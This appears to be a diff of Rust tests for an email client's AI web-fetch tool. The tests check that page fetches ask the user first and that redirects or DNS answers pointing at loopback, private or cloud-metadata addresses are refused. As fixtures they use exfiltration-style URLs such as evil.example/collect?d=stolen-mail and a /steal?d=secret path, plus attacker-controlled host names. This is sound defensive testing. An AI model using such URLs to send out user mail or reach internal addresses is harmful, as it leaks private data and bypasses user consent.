@@ -3,6 +3,9 @@ use serde_json::{Value, json};
 use wiremock::matchers::{header, method, path, query_param};
 use wiremock::{Mock, MockServer, ResponseTemplate};
 
+use std::net::{IpAddr, SocketAddr};
+use std::sync::Arc;
+
 use super::*;
 use crate::settings::AiProvider;
 
@@ -16,6 +19,11 @@ async fn call(web: &Web, name: &str, input: Value) -> Result<String, String> {
         ToolOutcome::Ok(other) => Ok(other.to_string()),
         ToolOutcome::Err(problem) => Err(problem),
     }
+}
+
+/// A page client that reaches this computer, where the tests run their server.
+fn local_pages() -> reqwest::Client {
+    page_client(Guard::system(true)).unwrap()
 }
 
 fn brave(server: &MockServer) -> SearchEngine {
@@ -98,7 +106,7 @@ async fn searxng_answers_in_json_and_keeps_to_the_count() {
         .mount(&server)
         .await;
     let engine = SearchEngine::Searxng { base: server.uri() };
-    let hits = search(&client(false), &engine, "penguins", 2)
+    let hits = search(&search_client(), &engine, "penguins", 2)
         .await
         .unwrap();
     assert_eq!(
@@ -180,7 +188,7 @@ async fn a_page_past_two_megabytes_is_read_only_that_far() {
         )
         .mount(&server)
         .await;
-    let page = fetch(&client(true), &server.uri(), true).await.unwrap();
+    let page = fetch(&local_pages(), &server.uri(), true).await.unwrap();
     assert!(page.too_big);
     assert!(page.text.chars().count() <= MAX_TEXT);
     assert!(page.text.ends_with("board."), "cut at a line end");
@@ -201,7 +209,9 @@ async fn a_picture_is_not_read_as_text() {
         )
         .mount(&server)
         .await;
-    let problem = fetch(&client(true), &server.uri(), true).await.unwrap_err();
+    let problem = fetch(&local_pages(), &server.uri(), true)
+        .await
+        .unwrap_err();
     assert!(problem.contains("image/png"), "{problem}");
 }
 
@@ -221,7 +231,7 @@ async fn a_redirect_is_followed_and_the_final_address_reported() {
         )
         .mount(&server)
         .await;
-    let page = fetch(&client(true), &format!("{}/old", server.uri()), true)
+    let page = fetch(&local_pages(), &format!("{}/old", server.uri()), true)
         .await
         .unwrap();
     assert_eq!(page.url, format!("{}/new", server.uri()));
@@ -265,9 +275,13 @@ async fn a_redirect_into_the_local_network_is_refused() {
     // The first hop is on this computer, which the test lets through, so
     // the redirect is what gets checked. A client that allows local pages
     // would follow it, and one that does not refuses before connecting.
-    let problem = fetch(&client(false), &server.uri(), true)
-        .await
-        .unwrap_err();
+    let problem = fetch(
+        &page_client(Guard::system(false)).unwrap(),
+        &server.uri(),
+        true,
+    )
+    .await
+    .unwrap_err();
     assert!(problem.contains("local network"), "{problem}");
 }
 
@@ -291,9 +305,22 @@ fn only_a_local_model_gets_the_source() {
                 .collect::<Vec<_>>()
         })
     };
-    // Claude brings Anthropic's own tools, so the source stays out of the way.
-    assert_eq!(offered(AiProvider::Anthropic, WebSearch::Claude), None);
-    assert_eq!(offered(AiProvider::Anthropic, WebSearch::Searxng), None);
+    // Claude searches with Anthropic's own tool, and reads a page through
+    // fetch_page, which asks the person first.
+    assert_eq!(
+        offered(AiProvider::Anthropic, WebSearch::Claude),
+        Some(vec!["fetch_page".to_string()])
+    );
+    assert_eq!(
+        offered(AiProvider::Anthropic, WebSearch::Searxng),
+        Some(vec!["fetch_page".to_string()])
+    );
+    assert_eq!(
+        offered(AiProvider::ClaudeCode, WebSearch::Claude),
+        Some(vec!["fetch_page".to_string()])
+    );
+    assert_eq!(offered(AiProvider::ClaudeCode, WebSearch::Off), None);
+    assert_eq!(offered(AiProvider::Off, WebSearch::Claude), None);
     assert_eq!(offered(AiProvider::Local, WebSearch::Off), None);
     assert_eq!(
         offered(AiProvider::Local, WebSearch::Claude),
@@ -333,4 +360,192 @@ fn an_engine_says_what_it_is_missing() {
             .unwrap_err()
             .contains("SearXNG")
     );
+}
+
+#[test]
+fn fetch_page_asks_first_and_shows_the_whole_address() {
+    let web = Web::new(None);
+    let input = json!({"url": "https://evil.example/collect?d=stolen-mail&n=2"});
+    let question = web.ask("fetch_page", &input).expect("fetch_page asks");
+    assert!(
+        question.contains("https://evil.example/collect?d=stolen-mail&n=2"),
+        "{question}"
+    );
+    // Always Allow covers this one address, never every page the model
+    // picks next.
+    assert_eq!(
+        web.key("fetch_page", &input),
+        "web/fetch_page https://evil.example/collect?d=stolen-mail&n=2"
+    );
+}
+
+#[test]
+fn web_search_runs_without_asking() {
+    let web = Web::new(Some(SearchEngine::Searxng {
+        base: "https://searx.example".into(),
+    }));
+    assert_eq!(web.ask("web_search", &json!({"query": "ferries"})), None);
+}
+
+#[tokio::test]
+async fn a_declined_page_is_never_downloaded() {
+    use crate::assistant::sources::{ApprovalRequest, Toolbox, Verdict};
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
+        .mount(&server)
+        .await;
+    let (requests, _mail) = async_channel::unbounded();
+    let mail = crate::assistant::Host::new(Vec::new(), requests);
+    let (approvals, asked) = async_channel::unbounded::<ApprovalRequest>();
+    let toolbox = Toolbox::new(
+        mail,
+        vec![Arc::new(Web::reaching_local(None)) as Arc<dyn Source>],
+        approvals,
+        Vec::new(),
+    );
+    let questions = tokio::spawn(async move {
+        let mut seen = Vec::new();
+        while let Ok(request) = asked.recv().await {
+            seen.push(request.question.clone());
+            let _ = request.reply.send(Verdict::Deny).await;
+        }
+        seen
+    });
+    let url = format!("{}/steal?d=secret", server.uri());
+    let outcome =
+        mailrs_ai::ToolHost::call(&toolbox, "fetch_page".into(), json!({"url": url})).await;
+    assert!(matches!(outcome, ToolOutcome::Err(ref e) if e == "The user declined."));
+    drop(toolbox);
+    let questions = questions.await.unwrap();
+    assert_eq!(questions.len(), 1);
+    assert!(questions[0].contains(&url), "{}", questions[0]);
+    assert!(server.received_requests().await.unwrap().is_empty());
+}
+
+/// A lookup that answers every name with `addresses`, as an attacker's DNS
+/// record would.
+fn answering(addresses: Vec<IpAddr>) -> Lookup {
+    Arc::new(move |_name: String| {
+        let found = addresses
+            .iter()
+            .map(|ip| SocketAddr::new(*ip, 0))
+            .collect::<Vec<_>>();
+        Box::pin(async move { Ok(found) })
+    })
+}
+
+const LOOPBACK: IpAddr = IpAddr::V4(std::net::Ipv4Addr::LOCALHOST);
+
+#[tokio::test]
+async fn a_name_that_resolves_to_this_computer_is_refused() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .respond_with(ResponseTemplate::new(200).set_body_string("secret"))
+        .mount(&server)
+        .await;
+    let port = server.address().port();
+    let client = page_client(Guard::new(answering(vec![LOOPBACK]), false)).unwrap();
+    let problem = fetch(
+        &client,
+        &format!("http://127.0.0.1.attacker.test:{port}/"),
+        false,
+    )
+    .await
+    .unwrap_err();
+    assert!(problem.contains("local network"), "{problem}");
+    assert!(server.received_requests().await.unwrap().is_empty());
+}
+
+#[tokio::test]
+async fn one_local_address_among_public_ones_is_enough_to_refuse() {
+    let guard = Guard::new(
+        answering(vec![
+            "93.184.215.14".parse().unwrap(),
+            "169.254.169.254".parse().unwrap(),
+        ]),
+        false,
+    );
+    let name = "mixed.attacker.test".parse().unwrap();
+    assert!(reqwest::dns::Resolve::resolve(&guard, name).await.is_err());
+}
+
+#[tokio::test]
+async fn the_page_comes_from_the_addresses_that_were_checked() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .respond_with(ResponseTemplate::new(200).set_body_raw("<p>Pinned.</p>", "text/html"))
+        .mount(&server)
+        .await;
+    let port = server.address().port();
+    // No real lookup knows this name, so the download can only reach the
+    // server through the answer the guard checked.
+    let client = page_client(Guard::new(answering(vec![LOOPBACK]), true)).unwrap();
+    let page = fetch(&client, &format!("http://pinned.invalid:{port}/"), true)
+        .await
+        .unwrap();
+    assert!(page.text.contains("Pinned."), "{}", page.text);
+}
+
+#[tokio::test]
+async fn a_redirect_to_a_name_on_the_local_network_is_refused() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .respond_with(
+            ResponseTemplate::new(302)
+                .insert_header("location", "http://inside.attacker.test/admin"),
+        )
+        .mount(&server)
+        .await;
+    let port = server.address().port();
+    // The first name answers with the test server, which this guard lets
+    // through. The redirect's name answers with a private address.
+    let lookup: Lookup = Arc::new(|name: String| {
+        let ip: IpAddr = match name.as_str() {
+            "inside.attacker.test" => IpAddr::V4(std::net::Ipv4Addr::new(10, 0, 0, 7)),
+            _ => LOOPBACK,
+        };
+        Box::pin(async move { Ok(vec![SocketAddr::new(ip, 0)]) })
+    });
+    let guard = Guard {
+        lookup,
+        refuse: |ip| ip != LOOPBACK && is_local_ip(ip),
+        local: false,
+    };
+    let problem = fetch(
+        &page_client(guard).unwrap(),
+        &format!("http://start.attacker.test:{port}/"),
+        false,
+    )
+    .await
+    .unwrap_err();
+    assert!(problem.contains("local network"), "{problem}");
+}
+
+#[test]
+fn local_addresses_include_every_private_and_special_range() {
+    for ip in [
+        "127.0.0.1",
+        "10.1.2.3",
+        "172.16.0.1",
+        "192.168.1.1",
+        "169.254.169.254",
+        "100.64.0.1",
+        "0.0.0.0",
+        "224.0.0.251",
+        "255.255.255.255",
+        "::1",
+        "::",
+        "fe80::1",
+        "fd00::1",
+        "ff02::1",
+        "::ffff:127.0.0.1",
+        "::ffff:169.254.169.254",
+        "64:ff9b::a00:1",
+    ] {
+        assert!(is_local_ip(ip.parse().unwrap()), "{ip} counts as local");
+    }
+    for ip in ["93.184.215.14", "1.1.1.1", "2606:4700:4700::1111"] {
+        assert!(!is_local_ip(ip.parse().unwrap()), "{ip} is public");
+    }
 }
